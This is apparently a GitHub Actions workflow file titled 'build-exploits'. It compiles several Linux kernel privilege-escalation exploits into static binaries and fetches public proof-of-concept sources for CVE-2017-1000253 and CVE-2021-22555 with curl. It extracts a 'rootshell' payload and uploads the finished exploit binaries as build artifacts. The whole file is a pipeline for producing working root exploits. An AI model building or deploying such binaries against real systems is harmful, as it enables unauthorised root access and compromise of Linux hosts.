name: build-exploits
on:
  workflow_dispatch:
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Compile static binaries
        run: |
          mkdir -p bin
          gcc -static -O2 -o bin/dirtydecrypt src/dirtydecrypt.c -lpthread
          gcc -static -O2 -o bin/fragnesia src/fragnesia.c -lpthread
          gcc -static -O2 -o bin/skb_segment_exploit src/skb_segment_exploit.c -lpthread
          curl -fsSL -o src/cve-2017-1000253.c https://www.qualys.com/2017/09/26/linux-pie-cve-2017-1000253/cve-2017-1000253.c
          cd src && sed -n '/^cat > rootshell.c/,/^EOF$/p' cve-2017-1000253.c | sed '1d;$d' > rootshell.c
          gcc -fpic -shared -nostartfiles -Os -s -o rootshell rootshell.c
          xxd -i rootshell > rootshell.h
          gcc -static -O2 -o ../bin/pie_exploit cve-2017-1000253.c -lpthread || true
          curl -fsSL -o cve-2021-22555.c https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
          gcc -static -O2 -o ../bin/cve-2021-22555 cve-2021-22555.c -lpthread || true
          cd ..
          ls -la bin/
          file bin/*
      - name: Upload binaries
        uses: actions/upload-artifact@v4
        with:
          name: exploits
          path: |
            bin/dirtydecrypt
            bin/fragnesia
            bin/skb_segment_exploit
            bin/pie_exploit
            bin/cve-2021-22555
          retention-days: 7
